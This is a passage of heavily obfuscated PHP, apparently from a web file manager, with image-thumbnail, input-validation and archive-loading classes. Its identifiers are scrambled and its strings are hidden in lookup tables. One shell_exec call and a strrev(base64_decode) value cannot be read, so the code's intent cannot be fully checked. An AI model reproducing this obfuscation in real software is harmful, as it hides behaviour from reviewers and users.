default: break; } if (!$dË¥‘¢çÕ¥ || $dË¥‘¢çÕ¥ == $DÓŒ‡ò™‰Ñ[41] || $dË¥‘¢çÕ¥ == $DÓŒ‡ò™‰Ñ[42]) { return; } $aˆ­Şò÷İö = $DÓŒ‡ò™‰Ñ[4] . str_replace($_SERVER[$DÓŒ‡ò™‰Ñ[36]], $DÓŒ‡ò™‰Ñ[20], $aˆ­Şò÷İö); $aİæË‘Òã = $dË¥‘¢çÕ¥ . $DÓŒ‡ò™‰Ñ[43] . $DŞòè†÷¬é . $DÓŒ‡ò™‰Ñ[43] . $aˆ­Şò÷İö . $DÓŒ‡ò™‰Ñ[43] . $d¶¹ù÷Û®; write_log($aİæË‘Òã . $DÓŒ‡ò™‰Ñ[18] . get_caller_msg(1), $DÓŒ‡ò™‰Ñ[19]); } $_SERVER[$_SERVER[Á][44]] = $_SERVER[$_SERVER[Á][36]] . $_SERVER[Á][45]; $e¶¡¶øœø® = strrev(base64_decode($_SERVER[Á][46])); goto EÄ…¾ÛÑÒÕ; fˆŸÖº­±Â: class ImageThumb { var $srcFile = ''; var $imgData = ''; var $echoType; var $im = ''; var $srcW = ''; var $srcH = ''; function __construct($AÅñŠ¸’é, $FÀã´Ô†¼•) { goto bÒÁÒîµÕ‹; bÒÁÒîµÕ‹: $this->srcFile = $AÅñŠ¸’é; $this->echoType = $FÀã´Ô†¼•; $this->im = self::image($AÅñŠ¸’é); goto F¥ÆÇ¹•”; E¡•ÕÊÙ£’: $this->srcW = imageSX($this->im); $this->srcH = imageSY($this->im); return $this; goto cø„”ÄĞ³ù; F¥ÆÇ¹•”: if (!$this->im) { return !1; } $cäÚ’¼³¡ = $_SERVER[‘®…¢À][33]; $this->imgData = GetImageSize($AÅñŠ¸’é, $cäÚ’¼³¡); goto E¡•ÕÊÙ£’; cø„”ÄĞ³ù: } public static function image($BøÔÌ„ä¸ˆ) { $BäİôæÙäÃ =& $_SERVER[‘®…¢À]; $aÄà„ˆñ» = $BäİôæÙäÃ[33]; $cìöè¸ƒ¢‘ = GetImageSize($BøÔÌ„ä¸ˆ, $aÄà„ˆñ»); $a¡ÄÀìŒÊ = !1; switch ($cìöè¸ƒ¢‘[2]) { case IMAGETYPE_GIF: if (!function_exists($BäİôæÙäÃ[1760])) { break; } $a¡ÄÀìŒÊ = imagecreatefromgif($BøÔÌ„ä¸ˆ); break; case IMAGETYPE_JPEG: if (!function_exists($BäİôæÙäÃ[1761])) { break; } $a¡ÄÀìŒÊ = imagecreatefromjpeg($BøÔÌ„ä¸ˆ); break; case IMAGETYPE_PNG: if (!function_exists($BäİôæÙäÃ[1762])) { break; } $a¡ÄÀìŒÊ = @imagecreatefrompng($BøÔÌ„ä¸ˆ); imagesavealpha($a¡ÄÀìŒÊ, !0); break; case IMAGETYPE_XBM: $a¡ÄÀìŒÊ = imagecreatefromxbm($BøÔÌ„ä¸ˆ); break; case IMAGETYPE_WBMP: $a¡ÄÀìŒÊ = imagecreatefromwbmp($BøÔÌ„ä¸ˆ); break; case IMAGETYPE_BMP: $a¡ÄÀìŒÊ = imagecreatefrombmp($BøÔÌ„ä¸ˆ); break; default: break; } return $a¡ÄÀìŒÊ; } public static function imageSize($aËœÛòåİŒ) { $F¢”‚Ö§›± =& $_SERVER[‘®…¢À]; $fäœíá„Ò = GetImageSize($aËœÛòåİŒ); if (!$fäœíá„Ò) { return !1; } return array($F¢”‚Ö§›±[1763] => $fäœíá„Ò[0], $F¢”‚Ö§›±[1764] => $fäœíá„Ò[1]); } function distortion($FñŸˆ…Äô, $fæ×³¢“Êğ, $dèó‹¬¢ßá) { $aÀ¥â´—¯¸ = $this->creatImage($this->im, $fæ×³¢“Êğ, $dèó‹¬¢ßá, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($aÀ¥â´—¯¸, $FñŸˆ…Äô); } function prorate($eÒ±»“ì½ß, $bÆÙãˆÒ£¨, $a¦„Œ¤¿“×) { $DÜÃô”ŒØÏ = $bÆÙãˆÒ£¨ / $a¦„Œ¤¿“×; $D•áÙ×ßËË = $this->srcW / $this->srcH; if ($DÜÃô”ŒØÏ <= $D•áÙ×ßËË) { $E°ôÌõºÃ… = $bÆÙãˆÒ£¨; $dƒƒ—êŠÔŞ = $E°ôÌõºÃ… * ($this->srcH / $this->srcW); } else { $dƒƒ—êŠÔŞ = $a¦„Œ¤¿“×; $E°ôÌõºÃ… = $dƒƒ—êŠÔŞ * ($this->srcW / $this->srcH); } if ($this->srcW > $bÆÙãˆÒ£¨ || $this->srcH > $a¦„Œ¤¿“×) { $b—ÕÏª÷æ = $this->creatImage($this->im, $E°ôÌõºÃ…, $dƒƒ—êŠÔŞ, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($b—ÕÏª÷æ, $eÒ±»“ì½ß); } else { $b—ÕÏª÷æ = $this->creatImage($this->im, $this->srcW, $this->srcH, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($b—ÕÏª÷æ, $eÒ±»“ì½ß); } } function cut($AÑÆ´ƒ¼ñ, $eß§‚¬ºİ¹, $C­Æ„¹×øœ) { goto AÀàîÕ†ã; B§†’æ‘Æ: return $this->echoImage($aÄæÕ¢Ö, $AÑÆ´ƒ¼ñ); goto bÖ‹Ğ¾µ“ˆ; f‡ç„ùÜ½Š: $e‚Ãƒ¢ãå‚ = $this->creatImage($this->im, $E›²í±ŸÏ”, $a×¤è¨Ùø, 0, 0, 0, 0, $this->srcW, $this->srcH); $aÄæÕ¢Ö = $this->creatImage($e‚Ãƒ¢ãå‚, $eß§‚¬ºİ¹, $C­Æ„¹×øœ, 0, 0, ($E›²í±ŸÏ” - $eß§‚¬ºİ¹) / 2, ($a×¤è¨Ùø - $C­Æ„¹×øœ) / 2, $eß§‚¬ºİ¹, $C­Æ„¹×øœ); imageDestroy($e‚Ãƒ¢ãå‚); goto B§†’æ‘Æ; AÀàîÕ†ã: $dñ¡‰×á‚ = $eß§‚¬ºİ¹ / $C­Æ„¹×øœ; $d…„²Ùè¼ = $this->srcW / $this->srcH; if ($dñ¡‰×á‚ <= $d…„²Ùè¼) { $a×¤è¨Ùø = $C­Æ„¹×øœ; $E›²í±ŸÏ” = $a×¤è¨Ùø * ($this->srcW / $this->srcH); } else { $E›²í±ŸÏ” = $eß§‚¬ºİ¹; $a×¤è¨Ùø = $E›²í±ŸÏ” * ($this->srcH / $this->srcW); } goto f‡ç„ùÜ½Š; bÖ‹Ğ¾µ“ˆ: } function backFill($AÇ¶¡¹–™, $d¶Óƒ õÙ­, $fÕ–ŸƒØ™ì, $a£ƒªó»¯ = false, $B¹˜ÜÖª¥È = 255, $F…íÃŒ¥Ø = 255, $e­…àØ»Ì‘ = 255) { goto FÆƒ‡ĞòÃã; D—‹¯½äÄ¼: if ($a£ƒªó»¯) { $FŠÛÁÕº¬ = imageColorTransparent($Eİ¾‹º¥Æ©, $FŠÛÁÕº¬); $e™êøê¢¢Î = $fÕ–ŸƒØ™ì - $d‹ÏÃöŸŠö; } imageFilledRectangle($Eİ¾‹º¥Æ©, 0, 0, $d¶Óƒ õÙ­, $fÕ–ŸƒØ™ì, $FŠÛÁÕº¬); if ($this->srcW > $d¶Óƒ õÙ­ || $this->srcH > $fÕ–ŸƒØ™ì) { $féÚîçºø = $this->creatImage($this->im, $BÆŠ³å†Õ, $d‹ÏÃöŸŠö, 0, 0, 0, 0, $this->srcW, $this->srcH); if ($BÆŠ³å†Õ < $d¶Óƒ õÙ­) { imageCopy($Eİ¾‹º¥Æ©, $féÚîçºø, ($d¶Óƒ õÙ­ - $BÆŠ³å†Õ) / 2, 0, 0, 0, $BÆŠ³å†Õ, $d‹ÏÃöŸŠö); } else { if ($d‹ÏÃöŸŠö < $fÕ–ŸƒØ™ì) { imageCopy($Eİ¾‹º¥Æ©, $féÚîçºø, 0, $e™êøê¢¢Î, 0, 0, $BÆŠ³å†Õ, $d‹ÏÃöŸŠö); } else { imageCopy($Eİ¾‹º¥Æ©, $féÚîçºø, 0, 0, 0, 0, $BÆŠ³å†Õ, $d‹ÏÃöŸŠö); } } } else { imageCopyMerge($Eİ¾‹º¥Æ©, $this->im, ($d¶Óƒ õÙ­ - $BÆŠ³å†Õ) / 2, $e™êøê¢¢Î, 0, 0, $BÆŠ³å†Õ, $d‹ÏÃöŸŠö, 100); } goto fÄÂ«“ö¶ã; fÄÂ«“ö¶ã: return $this->echoImage($Eİ¾‹º¥Æ©, $AÇ¶¡¹–™); goto cùÏ©”áêœ; FÆƒ‡ĞòÃã: $FÈÍåøä° = $d¶Óƒ õÙ­ / $fÕ–ŸƒØ™ì; $A¾ĞÚíç‘ = $this->srcW / $this->srcH; if ($FÈÍåøä° <= $A¾ĞÚíç‘) { $BÆŠ³å†Õ = $d¶Óƒ õÙ­; $d‹ÏÃöŸŠö = $BÆŠ³å†Õ * ($this->srcH / $this->srcW); } else { $d‹ÏÃöŸŠö = $fÕ–ŸƒØ™ì; $BÆŠ³å†Õ = $d‹ÏÃöŸŠö * ($this->srcW / $this->srcH); } goto eœ°˜—á…•; eœ°˜—á…•: if (function_exists($_SERVER[‘®…¢À][1765])) { @($Eİ¾‹º¥Æ© = imageCreateTrueColor($d¶Óƒ õÙ­, $fÕ–ŸƒØ™ì)); if (!$Eİ¾‹º¥Æ©) { $Eİ¾‹º¥Æ© = imageCreate($d¶Óƒ õÙ­, $fÕ–ŸƒØ™ì); } } else { $Eİ¾‹º¥Æ© = imageCreate($d¶Óƒ õÙ­, $fÕ–ŸƒØ™ì); } $e™êøê¢¢Î = ($fÕ–ŸƒØ™ì - $d‹ÏÃöŸŠö) / 2; $FŠÛÁÕº¬ = imagecolorallocate($Eİ¾‹º¥Æ©, $B¹˜ÜÖª¥È, $F…íÃŒ¥Ø, $e­…àØ»Ì‘); goto D—‹¯½äÄ¼; cùÏ©”áêœ: } function creatImage($bºØï¼—¼‹, $a­š„Š®‹, $F™ÅßğµË°, $AÖš¼ì¿ä, $F·æÖØøŒ, $B´–°èš¼, $CÈŠä‰õ­¦, $A÷İ‰®“ò, $c¢ˆòÏ¬Åœ) { if (function_exists($_SERVER[‘®…¢À][1765])) { @($e¦àäÔ¬» = ImageCreateTrueColor($a­š„Š®‹, $F™ÅßğµË°)); @imagealphablending($e¦àäÔ¬», !1); @imagesavealpha($e¦àäÔ¬», !0); if ($e¦àäÔ¬») { imageCopyResampled($e¦àäÔ¬», $bºØï¼—¼‹, $AÖš¼ì¿ä, $F·æÖØøŒ, $B´–°èš¼, $CÈŠä‰õ­¦, $a­š„Š®‹, $F™ÅßğµË°, $A÷İ‰®“ò, $c¢ˆòÏ¬Åœ); } else { $e¦àäÔ¬» = ImageCreate($a­š„Š®‹, $F™ÅßğµË°); imageCopyResized($e¦àäÔ¬», $bºØï¼—¼‹, $AÖš¼ì¿ä, $F·æÖØøŒ, $B´–°èš¼, $CÈŠä‰õ­¦, $a­š„Š®‹, $F™ÅßğµË°, $A÷İ‰®“ò, $c¢ˆòÏ¬Åœ); } } else { $e¦àäÔ¬» = ImageCreate($a­š„Š®‹, $F™ÅßğµË°); imageCopyResized($e¦àäÔ¬», $bºØï¼—¼‹, $AÖš¼ì¿ä, $F·æÖØøŒ, $B´–°èš¼, $CÈŠä‰õ­¦, $a­š„Š®‹, $F™ÅßğµË°, $A÷İ‰®“ò, $c¢ˆòÏ¬Åœ); } return $e¦àäÔ¬»; } public function imgRotate($d†õóà”ƒ, $aÃÙß‰æø·) { goto EÆ¥ô©¯”Æ; A¨ÂêŒ¼²÷: return $AƒÉ’Õëî†; goto bùŞ¥ÍØ½•; CÑ™¿¨İ±: switch ($this->imgData[2]) { case IMAGETYPE_GIF: $AƒÉ’Õëî† = imagegif($fù°êÜ•”¶, $d†õóà”ƒ); break; case IMAGETYPE_JPEG: $AƒÉ’Õëî† = imagejpeg($fù°êÜ•”¶, $d†õóà”ƒ, 100); break; case IMAGETYPE_PNG: $AƒÉ’Õëî† = imagePNG($fù°êÜ•”¶, $d†õóà”ƒ); break; default: break; } imageDestroy($fù°êÜ•”¶); imageDestroy($this->im); goto A¨ÂêŒ¼²÷; EÆ¥ô©¯”Æ: if (!$this->im || $aÃÙß‰æø· % 360 === 0 || !function_exists($_SERVER[‘®…¢À][1766])) { return !1; } $fù°êÜ•”¶ = imageRotate($this->im, 360 - $aÃÙß‰æø·, 0); $AƒÉ’Õëî† = !1; goto CÑ™¿¨İ±; bùŞ¥ÍØ½•: } function echoImage($AÂî¬ñ‹åñ, $d×Û¸³İ£Ç) { goto eùÛ•áŒâÑ; e¬Œ™ÁÃ×Ø: $b‚‘ÖÉ¹À = !1; switch ($this->echoType) { case $A¸„Ëõ‰Ûï[1767]: $b‚‘ÖÉ¹À = imagePNG($AÂî¬ñ‹åñ); break; case $A¸„Ëõ‰Ûï[164]: $b‚‘ÖÉ¹À = imagePNG($AÂî¬ñ‹åñ, $d×Û¸³İ£Ç); break; } imageDestroy($AÂî¬ñ‹åñ); goto B÷»„º‚§Š; B÷»„º‚§Š: imageDestroy($this->im); return $b‚‘ÖÉ¹À; goto F¾²¯±ã±; eùÛ•áŒâÑ: $A¸„Ëõ‰Ûï =& $_SERVER[‘®…¢À]; if (!$AÂî¬ñ‹åñ) { return !1; } ob_get_clean(); goto e¬Œ™ÁÃ×Ø; F¾²¯±ã±: } } if (!function_exists($_SERVER[‘®…¢À][1768])) { define($_SERVER[‘®…¢À][1769], 0); define($_SERVER[‘®…¢À][1770], 1); define($_SERVER[‘®…¢À][1771], 2); function imageflip($f² ğñìä, $E¯­ÑïÑ¬) { switch ($E¯­ÑïÑ¬) { case IMG_FLIP_HORIZONTAL: $A¨…³íÊ = imagesx($f² ğñìä) - 1; $fóÔöœë— = $A¨…³íÊ / 2; $e­‡ª™ìº˜ = imagesy($f² ğñìä); $D°‚›§ÂÀõ = imageistruecolor($f² ğñìä) ? imagecreatetruecolor(1, $e­‡ª™ìº˜) : imagecreate(1, $e­‡ª™ìº˜); for ($bÄ°‡š…Œ¤ = 0; $bÄ°‡š…Œ¤ < $fóÔöœë—; ++$bÄ°‡š…Œ¤) { imagecopy($D°‚›§ÂÀõ, $f² ğñìä, 0, 0, $bÄ°‡š…Œ¤, 0, 1, $e­‡ª™ìº˜); imagecopy($f² ğñìä, $f² ğñìä, $bÄ°‡š…Œ¤, 0, $A¨…³íÊ - $bÄ°‡š…Œ¤, 0, 1, $e­‡ª™ìº˜); imagecopy($f² ğñìä, $D°‚›§ÂÀõ, $A¨…³íÊ - $bÄ°‡š…Œ¤, 0, 0, 0, 1, $e­‡ª™ìº˜); } break; case IMG_FLIP_VERTICAL: $cé½ß¦‡À‰ = imagesx($f² ğñìä); $AòÏº¢»Ã = imagesy($f² ğñìä) - 1; $FÔÕò•¨À© = $AòÏº¢»Ã / 2; $D°‚›§ÂÀõ = imageistruecolor($f² ğñìä) ? imagecreatetruecolor($cé½ß¦‡À‰, 1) : imagecreate($cé½ß¦‡À‰, 1); for ($B¶ŒŸ˜µé = 0; $B¶ŒŸ˜µé < $FÔÕò•¨À©; ++$B¶ŒŸ˜µé) { imagecopy($D°‚›§ÂÀõ, $f² ğñìä, 0, 0, 0, $B¶ŒŸ˜µé, $cé½ß¦‡À‰, 1); imagecopy($f² ğñìä, $f² ğñìä, 0, $B¶ŒŸ˜µé, 0, $AòÏº¢»Ã - $B¶ŒŸ˜µé, $cé½ß¦‡À‰, 1); imagecopy($f² ğñìä, $D°‚›§ÂÀõ, 0, $AòÏº¢»Ã - $B¶ŒŸ˜µé, 0, 0, $cé½ß¦‡À‰, 1); } break; case IMG_FLIP_BOTH: $cé½ß¦‡À‰ = imagesx($f² ğñìä); $e­‡ª™ìº˜ = imagesy($f² ğñìä); $D°‚›§ÂÀõ = imagerotate($f² ğñìä, 180, 0); imagecopy($f² ğñìä, $D°‚›§ÂÀõ, 0, 0, 0, 0, $cé½ß¦‡À‰, $e­‡ª™ìº˜); break; default: return; } imagedestroy($D°‚›§ÂÀõ); } } if (!function_exists($_SERVER[‘®…¢À][1772])) { function imagecreatefrombmp($cç‚½ÃÏËÀ) { return ImageGdBMP::load($cç‚½ÃÏËÀ); } } goto aøô¡«ˆ£; aøô¡«ˆ£: class Input { public static function getArray($F½‚†‰É«†) { goto eßŠì½À‚•; eßŠì½À‚•: $dº„ô’‰Ğ =& $_SERVER[‘®…¢À]; global $in; $cÓù¡‚ˆÏ = array(); goto B»ÀğÈñâƒ; AŠ™İ¿…š·: if (count($bŸÊíèò‹õ) > 0) { show_json(implode($dº„ô’‰Ğ[1778], $bŸÊíèò‹õ), !1); } return $cÓù¡‚ˆÏ; goto D–õß¾Íá¾; B»ÀğÈñâƒ: $bŸÊíèò‹õ = array(); $cÜë§¥ØñÇ = LNG($dº„ô’‰Ğ[1773]); foreach ($F½‚†‰É«† as $c Ö¸ö¯ => $c¼ÖšŠåæ) { goto Aî˜š˜®¨é; bíÒà¾Î¨ç: if (isset($c¼ÖšŠåæ[$dº„ô’‰Ğ[1777]]) && !self::check($in[$c Ö¸ö¯], $c¼ÖšŠåæ[$dº„ô’‰Ğ[1777]], $bîï§•Ëñ³)) { if (array_key_exists($dº„ô’‰Ğ[1776], $c¼ÖšŠåæ)) { if (!is_null($c¼ÖšŠåæ[$dº„ô’‰Ğ[1776]])) { $cÓù¡‚ˆÏ[$EÀã«¸ñ¼] = $c¼ÖšŠåæ[$dº„ô’‰Ğ[1776]]; } } else { $bŸÊíèò‹õ[] = $C¥™Ôå¹¨; } continue; } $cÓù¡‚ˆÏ[$EÀã«¸ñ¼] = $in[$c Ö¸ö¯]; goto d«òáò£´; C÷ØôÄÖ¼¶: if (!array_key_exists($c Ö¸ö¯, $in)) { if (array_key_exists($dº„ô’‰Ğ[1776], $c¼ÖšŠåæ)) { if (!is_null($c¼ÖšŠåæ[$dº„ô’‰Ğ[1776]])) { $cÓù¡‚ˆÏ[$EÀã«¸ñ¼] = $c¼ÖšŠåæ[$dº„ô’‰Ğ[1776]]; } } else { if (isset($c¼ÖšŠåæ[$dº„ô’‰Ğ[1777]])) { $bŸÊíèò‹õ[] = $C¥™Ôå¹¨; } } continue; } if (isset($c¼ÖšŠåæ[$dº„ô’‰Ğ[1777]]) && $c¼ÖšŠåæ[$dº„ô’‰Ğ[1777]] == $dº„ô’‰Ğ[279]) { $CŞÈŒ·ŒÎ = json_decode($in[$c Ö¸ö¯], !0); if (is_array($CŞÈŒ·ŒÎ)) { $cÓù¡‚ˆÏ[$EÀã«¸ñ¼] = $CŞÈŒ·ŒÎ; } else { if (array_key_exists($dº„ô’‰Ğ[1776], $c¼ÖšŠåæ)) { if (!is_null($c¼ÖšŠåæ[$dº„ô’‰Ğ[1776]])) { $cÓù¡‚ˆÏ[$EÀã«¸ñ¼] = $c¼ÖšŠåæ[$dº„ô’‰Ğ[1776]]; } } else { $bŸÊíèò‹õ[] = $C¥™Ôå¹¨; } } continue; } $bîï§•Ëñ³ = _get($c¼ÖšŠåæ, $dº„ô’‰Ğ[968]); goto bíÒà¾Î¨ç; Aî˜š˜®¨é: $C¥™Ôå¹¨ = _get($c¼ÖšŠåæ, $dº„ô’‰Ğ[1774], $cÜë§¥ØñÇ . $dº„ô’‰Ğ[861] . $c Ö¸ö¯); $EÀã«¸ñ¼ = $c Ö¸ö¯; if (isset($c¼ÖšŠåæ[$dº„ô’‰Ğ[1775]]) && $c¼ÖšŠåæ[$dº„ô’‰Ğ[1775]]) { $EÀã«¸ñ¼ = $c¼ÖšŠåæ[$dº„ô’‰Ğ[1775]]; } goto C÷ØôÄÖ¼¶; d«òáò£´: } goto AŠ™İ¿…š·; D–õß¾Íá¾: } public static function reg($dÃí•¿ÁÊ = "\x72\145\x71\165\x69\x72\x65") { static $E­íˆÈÛ¨ô = array("\x72\145\x71\165\x69\162\145" => "\56\53", "\156\x75\155\142\x65\162" => "\134\x64\x2b", "\x68\145\170" => "\x5b\60\x2d\x39\101\x2d\x46\141\x2d\146\135\53", "\151\156\164" => "\x5b\55\134\53\135\x3f\134\144\53", "\142\x6f\157\x6c" => "\60\174\x31", "\x66\x6c\157\x61\x74" => "\x5b\x2d\134\x2b\x5d\x3f\134\x64\x2b\50\134\56\134\144\53\x29\x3f", "\x65\x6e\x67\154\x69\163\150" => "\133\101\55\x5a\x61\55\x7a\x20\135\x2b", "\143\150\x69\x6e\145\163\145" => "\133\134\x78\173\x34\x65\x30\60\x7d\x2d\x5c\x78\173\x39\x66\141\65\x7d\135\53", "\x68\x61\x73\103\x68\151\156\x65\163\x65" => "\57\50\x5b\134\170\173\x34\x65\x30\x30\175\55\134\x78\173\x39\x66\141\x35\x7d\135\x2b\51\x2f\x75", "\145\x6d\x61\151\154" => "\134\x77\x2b\50\133\x5c\x2e\x5c\x2d\135\134\167\x2b\x29\x2a\134\x40\134\167\53\50\x5b\134\56\x5c\x2d\x5d\x5c\x77\53\51\x2a\134\x2e\134\x77\x2b", "\x70\150\157\156\x65" => "\61\133\x33\x2d\x39\x5d\x5c\x64\x7b\71\x7d", "\164\x65\154\160\150\157\156\x65" => "\50\x5c\x28\x5c\x64\x7b\63\54\x34\175\134\x29\x7c\x5c\x64\173\63\x2c\64\175\x2d\x7c\x5c\x73\51\77\x5c\x64\173\67\x2c\61\64\175", "\165\x72\154" => "\50\150\164\164\160\174\x66\x74\x70\174\x68\x74\x74\160\x73\51\x3a\x5c\57\x5c\x2f\x5b\x5c\x77\x5c\x2d\x5f\x5d\x2b\50\x5c\x2e\133\x5c\x77\x5c\x2d\137\135\x2b\x29\53\x28\133\x5c\167\x5c\55\x5c\56\x2c\x40\77\136\x3d\x25\x26\72\x5c\57\176\x5c\53\x23\x5d\x2a\133\134\167\x5c\55\134\100\x3f\136\75\x25\46\134\x2f\x7e\x5c\x2b\43\x5d\x29\77", "\x75\162\154\106\165\x6c\x6c" => "\x5b\x61\x2d\172\101\55\172\x5d\x2b\x3a\134\x2f\134\57\133\x5e\134\x73\135\x2a", "\151\x70" => "\50\x5c\x64\x7b\61\54\63\x7d\x5c\x2e\51\x7b\63\175\x28\134\144\173\x31\54\x33\175\51", "\x7a\151\160" => "\133\x31\x2d\71\135\x5c\144\x7b\65\175\x28\x3f\41\134\144\x29", "\151\144\x43\141\x72\x64" => "\50\134\x64\x7b\x31\65\x7d\x29\174\x28\x5c\x64\x7b\x31\67\175\50\x5c\144\x7c\x58\174\x78\51\51", "\143\x6f\x6c\157\x72" => "\x23\50\133\60\x2d\x39\101\55\x46\141\55\x66\135\173\63\x7d\174\133\x30\x2d\71\x41\x2d\x46\141\x2d\x66\135\x7b\x36\175\51", "\164\151\x6d\x65" => "\50\x5b\60\55\x31\135\x5c\144\174\x32\133\60\x2d\x34\135\x29\72\133\60\55\65\135\x5c\x64", "\x64\141\164\145" => "\x5c\x64\173\64\175\x5b\x2d\x5c\x2f\135\77\50\x30\x5b\61\x2d\x39\x5d\174\x31\x5b\x30\55\x32\x5d\x29\133\x2d\134\57\135\77\x28\133\60\55\x32\x5d\134\x64\174\63\133\x30\x2d\x31\x5d\51", "\x64\x61\164\145\124\x69\x6d\145" => "\x5c\144\173\x34\175\x5b\55\x5c\57\x5d\77\x28\x30\133\61\x2d\71\135\x7c\61\133\x30\55\x32\x5d\x29\133\x2d\x5c\x2f\135\77\x28\x5b\x30\x2d\x32\135\x5c\144\174\x33\x5b\60\55\x31\135\x29\x5c\x73\x2b\50\x5b\x30\55\61\x5d\134\x64\x7c\62\x5b\x30\x2d\64\x5d\x29\72\x5b\60\55\65\135\x5c\144", "\160\x61\163\163\x77\157\x72\144" => "\50\x3f\75\x2e\52\x5c\144\51\x28\x3f\x3d\x2e\x2a\x5b\x61\x2d\x7a\135\x29\x28\77\75\x2e\x2a\133\x41\x2d\132\135\51\x2e\173\70\x2c\62\60\x7d", "\153\x65\x79" => "\133\x41\x2d\x5a\x61\x2d\172\x30\55\71\137\x5c\55\134\x2e\x5d\53", "\x6b\x65\x79\x46\x75\x6c\x6c" => "\x5b\101\55\132\141\55\x7a\x30\x2d\x39\137\134\55\134\x2e\134\163\54\135\x2b"); if (!$dÃí•¿ÁÊ) { return $E­íˆÈÛ¨ô; } return $E­íˆÈÛ¨ô[$dÃí•¿ÁÊ]; } public static function check($FÒ¢Í••, $e†˜ãğî¾ê, $Aö­ö±©• = null) { $E‰–Ç¿¡¤­ =& $_SERVER[‘®…¢À]; switch ($e†˜ãğî¾ê) { case $E‰–Ç¿¡¤­[7]: return in_array($FÒ¢Í••, $Aö­ö±©•); break; case $E‰–Ç¿¡¤­[1779]: return floatval($FÒ¢Í••) > $Aö­ö±©•; break; case $E‰–Ç¿¡¤­[1780]: return floatval($FÒ¢Í••) < $Aö­ö±©•; break; case $E‰–Ç¿¡¤­[322]: return strlen($FÒ¢Í••) >= $Aö­ö±©•[0] && strlen($FÒ¢Í••) <= $Aö­ö±©•[1]; break; case $E‰–Ç¿¡¤­[322]: if (is_array($Aö­ö±©•)) { return strlen($FÒ¢Í••) >= $Aö­ö±©•[0] && strlen($FÒ¢Í••) <= $Aö­ö±©•[1]; break; } else { return strlen($FÒ¢Í••) == $Aö­ö±©•; break; } case $E‰–Ç¿¡¤­[318]: return floatval($FÒ¢Í••) >= $Aö­ö±©•[0] && floatval($FÒ¢Í••) <= $Aö­ö±©•[1]; break; } $aŠ÷ËÏÙŠ„ = self::reg(!1); $e†˜ãğî¾ê = isset($aŠ÷ËÏÙŠ„[$e†˜ãğî¾ê]) ? $aŠ÷ËÏÙŠ„[$e†˜ãğî¾ê] : $e†˜ãğî¾ê; if (substr($e†˜ãğî¾ê, 0, 1) != $E‰–Ç¿¡¤­[8]) { $e†˜ãğî¾ê = $E‰–Ç¿¡¤­[1781] . $e†˜ãğî¾ê . $E‰–Ç¿¡¤­[1782]; } return preg_match($e†˜ãğî¾ê, $FÒ¢Í••) === 1; } public static function get($dæöŸÀâñ, $càÖŠ¯¨¦‹ = null, $d®¯îÀÈÙš = null, $dô®¦†óÖ = null) { goto C´œ­Ç´Ÿ£; bÖİ÷ÇŒ»õ: if (!is_null($dô®¦†óÖ)) { $dÏ¬èìŠÇ[$A†ÁË¬áÌ’[968]] = $dô®¦†óÖ; } if (!is_null($càÖŠ¯¨¦‹)) { $dÏ¬èìŠÇ[$A†ÁË¬áÌ’[1777]] = $càÖŠ¯¨¦‹; } $cÓŞ¯ÎìÁé = Input::getArray(array($dæöŸÀâñ => $dÏ¬èìŠÇ)); goto c‡šæ†‰ …; c‡šæ†‰ …: return $cÓŞ¯ÎìÁé[$dæöŸÀâñ]; goto eŸÊóïÀ¡; C´œ­Ç´Ÿ£: $A†ÁË¬áÌ’ =& $_SERVER[‘®…¢À]; $dÏ¬èìŠÇ = array(); if (!is_null($d®¯îÀÈÙš)) { $dÏ¬èìŠÇ[$A†ÁË¬áÌ’[34]] = $d®¯îÀÈÙš; } goto bÖİ÷ÇŒ»õ; eŸÊóïÀ¡: } } class KodArchive { static function init() { goto Eñì‹’œĞÌ; D¡©¥ÕÙçš: define($FùòÊƒñ­[1785], TEMP_FILES); define($FùòÊƒñ­[1786], TEMP_FILES); define($FùòÊƒñ­[1787], $FùòÊƒñ­[1788]); goto d¼¬“ãöñˆ; Eñì‹’œĞÌ: $FùòÊƒñ­ =& $_SERVER[‘®…¢À]; if (defined($FùòÊƒñ­[1783])) { return; } define($FùòÊƒñ­[1783], SDK_DIR . $FùòÊƒñ­[1784]); goto D¡©¥ÕÙçš; c‹ŠïÜ•–: require_once ARCHIVE_LIB . $FùòÊƒñ­[1791]; require_once ARCHIVE_LIB . $FùòÊƒñ­[1792]; require_once ARCHIVE_LIB . $FùòÊƒñ­[1793]; goto c×±ˆ„ÅíŸ; c×±ˆ„ÅíŸ: require_once ARCHIVE_LIB . $FùòÊƒñ­[1794]; goto bÏŒÊ¶Òƒ¯; d¼¬“ãöñˆ: mk_dir(TEMP_FILES); require_once ARCHIVE_LIB . $FùòÊƒñ­[1789]; require_once ARCHIVE_LIB . $FùòÊƒñ­[1790]; goto c‹ŠïÜ•–; bÏŒÊ¶Òƒ¯: } static function checkIfType($F•Âƒù¤—›, $BÈìõ•ÒŸ) { goto D—ô…Ÿù„˜; B†¹ÏŞ¯: $f•Ü‘ÙÇù = in_array($F•Âƒù¤—›, $BšÕ²˜©ë[$BÈìõ•ÒŸ]); if ($f•Ü‘ÙÇù && ($BÈìõ•ÒŸ == $BÀî‡ŞÅ[298] || $BÈìõ•ÒŸ == $BÀî‡ŞÅ[1798]) && (!function_exists($BÀî‡ŞÅ[1806]) || !function_exists($BÀî‡ŞÅ[1807]))) { show_tips($BÀî‡ŞÅ[1808]); } if ($f•Ü‘ÙÇù && $BÈìõ•ÒŸ == $BÀî‡ŞÅ[1003] && (!function_exists($BÀî‡ŞÅ[1809]) || !strstr(shell_exec($BÀî‡ŞÅ[1810]), $BÀî‡ŞÅ[1811]))) { show_tips($BÀî‡ŞÅ[1812]); } goto FÌ¤…®…; FÌ¤…®…: return $f•Ü‘ÙÇù; goto fŞï·¥‹; D—ô…Ÿù„˜: $BÀî‡ŞÅ =& $_SERVER[‘®…¢À]; self::init(); $BšÕ²˜©ë = array($BÀî‡ŞÅ[298] => array($BÀî‡ŞÅ[298], $BÀî‡ŞÅ[1795], $BÀî‡ŞÅ[1796], $BÀî‡ŞÅ[1797]), $BÀî‡ŞÅ[1798] => array($BÀî‡ŞÅ[1798], $BÀî‡ŞÅ[1799], $BÀî‡ŞÅ[1001], $BÀî‡ŞÅ[999]), $BÀî‡ŞÅ[1003] => array($BÀî‡ŞÅ[1003], $BÀî‡ŞÅ[1800], $BÀî‡ŞÅ[1801], $BÀî‡ŞÅ[1802], $BÀî‡ŞÅ[1803], $BÀî‡ŞÅ[1804], 